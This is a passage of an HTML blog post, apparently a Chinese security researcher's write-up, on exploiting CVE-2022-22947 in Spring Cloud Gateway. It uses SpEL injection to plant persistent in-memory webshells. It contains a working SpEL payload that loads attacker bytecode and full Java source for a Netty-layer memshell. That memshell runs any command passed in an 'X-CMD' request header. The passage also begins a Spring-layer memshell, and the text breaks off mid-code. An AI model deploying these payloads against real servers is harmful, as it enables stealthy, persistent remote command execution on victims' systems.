@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00 背景最进小火的漏洞CVE-2022-22947虽然原理简单，但是实战利用还是有点小麻烦。目前公开的利用是每执行一条命就得注册一条路由，refresh一下网关，最后在访问这个路由。先不说步骤较多，就是频繁刷新会影响业务。实战当中注入一个内存马才是硬道理！ spring cloud gateway的web服务是netty+spring构建的，netty的web服务没有遵循servlet规范来">
+<meta name="keywords" content="漏洞利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring cloud gateway通过SPEL注入内存马">
+<meta property="og:url" content="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/index.html">
+<meta property="og:site_name" content="回忆飘如雪">
+<meta property="og:description" content="0x00 背景最进小火的漏洞CVE-2022-22947虽然原理简单，但是实战利用还是有点小麻烦。目前公开的利用是每执行一条命就得注册一条路由，refresh一下网关，最后在访问这个路由。先不说步骤较多，就是频繁刷新会影响业务。实战当中注入一个内存马才是硬道理！ spring cloud gateway的web服务是netty+spring构建的，netty的web服务没有遵循servlet规范来">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/netty-memshell.jpeg">
+<meta property="og:image" content="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/handlerMapping.png">
+<meta property="og:image" content="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/get-RequestMappingHandlerMapping.png">
+<meta property="og:image" content="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/inject-spring-requestmapping-memshell.png">
+<meta property="og:image" content="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/spring-requestmapping-memshell.png">
+<meta property="og:updated_time" content="2022-03-08T17:33:54.792Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Spring cloud gateway通过SPEL注入内存马">
+<meta name="twitter:description" content="0x00 背景最进小火的漏洞CVE-2022-22947虽然原理简单，但是实战利用还是有点小麻烦。目前公开的利用是每执行一条命就得注册一条路由，refresh一下网关，最后在访问这个路由。先不说步骤较多，就是频繁刷新会影响业务。实战当中注入一个内存马才是硬道理！ spring cloud gateway的web服务是netty+spring构建的，netty的web服务没有遵循servlet规范来">
+<meta name="twitter:image" content="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/netty-memshell.jpeg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>
+		
+			Spring cloud gateway通过SPEL注入内存马 | 回忆飘如雪
+		
+	</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/gossip/">闲言碎语</a></li>
+         
+          <li><a href="/links/">左邻右舍</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/articles/2022/rwctf-4th-desperate-cat-ascii-jar-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&text=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&is_video=false&description=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring cloud gateway通过SPEL注入内存马&body=Check out this article: https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&title=Spring cloud gateway通过SPEL注入内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/&name=Spring cloud gateway通过SPEL注入内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-背景"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-高可用Payload"><span class="toc-number">2.</span> <span class="toc-text">0x01 高可用Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-netty层内存马"><span class="toc-number">3.</span> <span class="toc-text">0x02 netty层内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Spring层内存马"><span class="toc-number">4.</span> <span class="toc-text">0x03 Spring层内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-总结"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考资料"><span class="toc-number">6.</span> <span class="toc-text">0x05 参考资料</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Spring cloud gateway通过SPEL注入内存马
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">c0ny1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-07T16:14:20.000Z" itemprop="datePublished">2022-03-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/漏洞利用/">漏洞利用</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最进小火的漏洞<code>CVE-2022-22947</code>虽然原理简单，但是实战利用还是有点小麻烦。目前公开的利用是每执行一条命就得注册一条路由，refresh一下网关，最后在访问这个路由。先不说步骤较多，就是频繁刷新会影响业务。实战当中注入一个内存马才是硬道理！</p>
+<p>spring cloud gateway的web服务是netty+spring构建的，netty的web服务没有遵循servlet规范来设计。这也导致了构造它的内存马，与常规中间件有所不同，从某种程度来讲是这是一种新类型的内存马。</p>
+<p>下面以vulhub中的<code>spring cloud gateway 3.1.0</code>作为环境，来分享下构造netty层和spring层的内存马，其他版本思路相同。</p>
+<h2 id="0x01-高可用Payload"><a href="#0x01-高可用Payload" class="headerlink" title="0x01 高可用Payload"></a>0x01 高可用Payload</h2><p>Spring cloud gateway对payload的稳定性要求比较高，一旦报错是由可能会影响业务的。所以在开始之前，我们需要先构造一个”优质”的SPEL执行java字节码的payload。</p>
+<p>我主要对payload进行了如下的优化：</p>
+<ol>
+<li>解决BCEL/js引擎兼容性问题</li>
+<li>解决base64在不同版本jdk的兼容问题</li>
+<li>可多次运行同类名字节码</li>
+<li>解决可能导致的ClassNotFound问题</li>
+</ol>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-netty层内存马"><a href="#0x02-netty层内存马" class="headerlink" title="0x02 netty层内存马"></a>0x02 netty层内存马</h2><p>netty处理http请求是构建一条责任链pipline,http请求会被链上的handler会依次来处理。所以我们的内存马其实就是一个handler。</p>
+<p>不像常规的中间件，<code>filter/servlet/listener</code>组件有一个统一的维护对象。netty每一个请求过来，都是动态构造pipeline，pipeline上的handler都是在这个时候new的。<strong>负责给pipeline添加handler是<code>ChannelPipelineConfigurer</code>(下面简称为configurer)，因此注入netty内存马的关键是分析<code>configurer</code>如何被netty管理和工作的。</strong></p>
+<p><code>CompositeChannelPipelineConfigurer#compositeChannelPipelineConfigurer</code>是为pipeline选择configurer的关键逻辑。第一个参数是Spring cloud gateway默认的configurer，第二个是用户额外配置的。一般情况下第一个参数是不为空配置，第二个参数为空配置，所以返回的configurer是Spring cloud gateway默认的。</p>
+<p>如果我们能够设置第二个other参数不为空配置呢？ 那么这两个configurer将被合并为一个新<code>CompositeChannelPipelineConfigurer</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reactor.netty.ReactorNetty.CompositeChannelPipelineConfigurer#compositeChannelPipelineConfigurer</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ChannelPipelineConfigurer <span class="title">compositeChannelPipelineConfigurer</span><span class="params">(ChannelPipelineConfigurer configurer, ChannelPipelineConfigurer other)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (configurer == ChannelPipelineConfigurer.emptyConfigurer()) &#123; <span class="comment">// 默认configurer是无操作空配置</span></span><br><span class="line">        <span class="keyword">return</span> other;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (other == ChannelPipelineConfigurer.emptyConfigurer()) &#123; <span class="comment">// 其他额外configurer是无操作空配置</span></span><br><span class="line">        <span class="keyword">return</span> configurer;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        ChannelPipelineConfigurer[] newConfigurers = <span class="keyword">new</span> ChannelPipelineConfigurer[length];</span><br><span class="line">        <span class="keyword">int</span> pos;</span><br><span class="line">        <span class="keyword">if</span> (thizConfigurers != <span class="keyword">null</span>) &#123;</span><br><span class="line">            pos = thizConfigurers.length;</span><br><span class="line">            System.arraycopy(thizConfigurers, <span class="number">0</span>, newConfigurers, <span class="number">0</span>, pos);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pos = <span class="number">1</span>;</span><br><span class="line">            newConfigurers[<span class="number">0</span>] = configurer;  <span class="comment">// 将默认configurer存储到新configurer</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (otherConfigurers != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.arraycopy(otherConfigurers, <span class="number">0</span>, newConfigurers, pos, otherConfigurers.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            newConfigurers[pos] = other; <span class="comment">// 将其他额外configurer存储到新configurer</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 合并成新的configurer</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReactorNetty.CompositeChannelPipelineConfigurer(newConfigurers);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>CompositeChannelPipelineConfigurer</code>会循环调用所有合并进来<code>configurer</code>来对<code>pipeline</code>添加<code>handler</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// reactor.netty.ReactorNetty.CompositeChannelPipelineConfigurer</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CompositeChannelPipelineConfigurer</span> <span class="keyword">implements</span> <span class="title">ChannelPipelineConfigurer</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ChannelPipelineConfigurer[] configurers;</span><br><span class="line"></span><br><span class="line">        CompositeChannelPipelineConfigurer(ChannelPipelineConfigurer[] configurers) &#123;</span><br><span class="line">            <span class="keyword">this</span>.configurers = configurers;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onChannelInit</span><span class="params">(ConnectionObserver connectionObserver, Channel channel, @Nullable SocketAddress remoteAddress)</span> </span>&#123;</span><br><span class="line">            ChannelPipelineConfigurer[] var4 = <span class="keyword">this</span>.configurers;</span><br><span class="line">            <span class="keyword">int</span> var5 = var4.length;</span><br><span class="line">            <span class="comment">// 循环调用所有configurer对pipeline设置handler</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var5; ++var6) &#123;</span><br><span class="line">                ChannelPipelineConfigurer configurer = var4[var6];</span><br><span class="line">                configurer.onChannelInit(connectionObserver, channel, remoteAddress);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以通过修改other参数为自己的configurer向pipline中添加内存马。翻阅源码发现<code>reactor.netty.transport.TransportConfig</code>类的<code>doOnChannelInit</code>属性存储着other参数，我使用<a href="https://github.com/c0ny1/java-object-searcher" target="_blank" rel="noopener">java-object-searcher</a>以<code>doOnChannelInit</code>为关键字，定位出了它在线程对象的位置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;[Ljava.lang.Thread;&#125; </span><br><span class="line">   ---&gt; [3] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$1&#125; = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$1&#125; </span><br><span class="line">    ---&gt; val$disposableServer = &#123;reactor.netty.transport.ServerTransport$InetDisposableBind&#125; </span><br><span class="line">     ---&gt; config = &#123;reactor.netty.http.server.HttpServerConfig&#125; </span><br><span class="line">        ---&gt; doOnChannelInit = &#123;reactor.netty.ReactorNetty$$Lambda$391/236567414&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终内存马构造如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NettyMemshell</span> <span class="keyword">extends</span> <span class="title">ChannelDuplexHandler</span> <span class="keyword">implements</span> <span class="title">ChannelPipelineConfigurer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doInject</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String msg = <span class="string">"inject-start"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method getThreads = Thread.class.getDeclaredMethod(<span class="string">"getThreads"</span>);</span><br><span class="line">            getThreads.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object threads = getThreads.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Array.getLength(threads); i++) &#123;</span><br><span class="line">                Object thread = Array.get(threads, i);</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="keyword">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="string">"NettyWebServer"</span>)) &#123;</span><br><span class="line">                    Field _val$disposableServer = thread.getClass().getDeclaredField(<span class="string">"val$disposableServer"</span>);</span><br><span class="line">                    _val$disposableServer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Object val$disposableServer = _val$disposableServer.get(thread);</span><br><span class="line">                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">                    _config.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Object config = _config.get(val$disposableServer);</span><br><span class="line">                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">"doOnChannelInit"</span>);</span><br><span class="line">                    _doOnChannelInit.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    _doOnChannelInit.set(config, <span class="keyword">new</span> NettyMemshell());</span><br><span class="line">                    msg = <span class="string">"inject-success"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            msg = <span class="string">"inject-error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// Step1. 作为一个ChannelPipelineConfigurer给pipline注册Handler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onChannelInit</span><span class="params">(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress)</span> </span>&#123;</span><br><span class="line">        ChannelPipeline pipeline = channel.pipeline();</span><br><span class="line">        <span class="comment">// 将内存马的handler添加到spring层handler的前面        </span></span><br><span class="line">        pipeline.addBefore(<span class="string">"reactor.left.httpTrafficHandler"</span>,<span class="string">"memshell_handler"</span>,<span class="keyword">new</span> NettyMemshell());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// Step2. 作为Handler处理请求，在此实现内存马的功能逻辑</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(msg <span class="keyword">instanceof</span> HttpRequest)&#123;</span><br><span class="line">            HttpRequest httpRequest = (HttpRequest)msg;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(httpRequest.headers().contains(<span class="string">"X-CMD"</span>)) &#123;</span><br><span class="line">                    String cmd = httpRequest.headers().get(<span class="string">"X-CMD"</span>);</span><br><span class="line">                    String execResult = <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next();</span><br><span class="line">                    <span class="comment">// 返回执行结果</span></span><br><span class="line">                    send(ctx, execResult, HttpResponseStatus.OK);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx.fireChannelRead(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> </span>&#123;</span><br><span class="line">        FullHttpResponse response = <span class="keyword">new</span> DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));</span><br><span class="line">        response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">"text/plain; charset=UTF-8"</span>);</span><br><span class="line">        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/netty-memshell.jpeg" alt="netty内存马执行效果"></p>
+<h2 id="0x03-Spring层内存马"><a href="#0x03-Spring层内存马" class="headerlink" title="0x03 Spring层内存马"></a>0x03 Spring层内存马</h2><p>Spring层request请求处理组件很多，有handler/Adapter/Filter等等，理论上都可以拿来做内存马，这里我分享下最简单的<code>RequestMappingHandler</code>。</p>
+<p>Spring cloud gateway主要的路由分发主要由<code>org.springframework.web.reactive.DispatcherHandler</code>类和它三个组件来完成</p>
+<ol>
+<li>org.springframework.web.reactive.HandlerMapping 路由比配器</li>
+<li>org.springframework.web.reactive.HandlerAdapter handler适配器</li>
+<li>org.springframework.web.reactive.HandlerResultHandler 结果处理器</li>
+</ol>
+<p>具体逻辑如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.springframework.web.reactive.DispatcherHandler#handle</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Mono&lt;Void&gt; <span class="title">handle</span><span class="params">(ServerWebExchange exchange)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.handlerMappings == <span class="keyword">null</span> ? <span class="keyword">this</span>.createNotFoundError() : Flux.fromIterable(<span class="keyword">this</span>.handlerMappings).concatMap((mapping) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> mapping.getHandler(exchange); <span class="comment">// Step1. 使用HandlerMapping匹配路由</span></span><br><span class="line">    &#125;).next().switchIfEmpty(<span class="keyword">this</span>.createNotFoundError()).flatMap((handler) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.invokeHandler(exchange, handler); <span class="comment">// Step2. 使用具体HandlerAdapter来处理具体请求</span></span><br><span class="line">    &#125;).flatMap((result) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.handleResult(exchange, result); <span class="comment">// Step3. 使用适合的HandlerResultHandler来处理返回的结果</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>基于这个流程，我们可以梳理出一个构造内存马的思路。让<code>HandlerMapping</code>注册一个映射关系，通过映射关系让特定的HandlerAdapter执行到我们的内存马流程，最后内存马返回一个HandlerResultHandler可以处理的结果类型即可。</p>
+<p>这里我选择<code>RequestMappingHandlerMapping</code>这个HandlerMapping，来注册一个与使用<code>@RequestMapping(&quot;/*&quot;)</code>等效的内存马。</p>
+<p><img src="/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/handlerMapping.png" alt="RequestMappingHandlerMapping"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringRequestMappingMemshell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doInject</span><span class="params">(Object requestMappingHandlerMapping)</span> </span>&#123;</span><br><span class="line">        String msg = <span class="string">"inject-start"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method registerHandlerMethod = requestMappingHandlerMapping.getClass().getDeclaredMethod(<span class="string">"registerHandlerMethod"</span>, Object.class, Method.class, RequestMappingInfo.class);</span><br><span class="line">            registerHandlerMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Method executeCommand = SpringRequestMappingMemshell.class.getDeclaredMethod(<span class="string">"executeCommand"</span>, String.class);</span><br><span class="line">            PathPattern pathPattern = <span class="keyword">new</span> PathPatternParser().parse(<span class="string">"/*"</span>);</span><br><span class="line">            PatternsRequestCondition patternsRequestCondition = <span class="keyword">new</span> 